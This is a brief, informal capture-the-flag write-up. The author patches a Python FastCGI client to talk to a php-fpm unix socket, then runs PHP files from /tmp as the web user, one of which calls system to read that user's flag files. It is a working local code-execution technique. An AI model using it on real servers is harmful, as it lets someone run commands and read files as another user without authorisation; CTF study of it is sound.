step 1 was looking for wtf is on server, checking nginx logs, discovering that unix socket
then, Step 2:

    git clone https://github.com/wuyunfeng/Python-FastCGI-Client.git

i modified it to use unix socket not internet socket
    -        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    +        self.sock = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
    -            self.sock.connect((self.host, int(self.port)))
    +            self.sock.connect("/var/run/php-fpm.sock")

then i put various php files in /tmp and executed them as webuser by sending them to this socket

    $ cat /tmp/example2.php
    <?php
    system("cat /home/webuser/*.flag");
    echo $homepage;
    ?>
    elf2207@grot0:~/Python-FastCGI-Client$ python fcgi.py http://127.0.0.1:9000/example2.php /tmp/ ""

and that's it
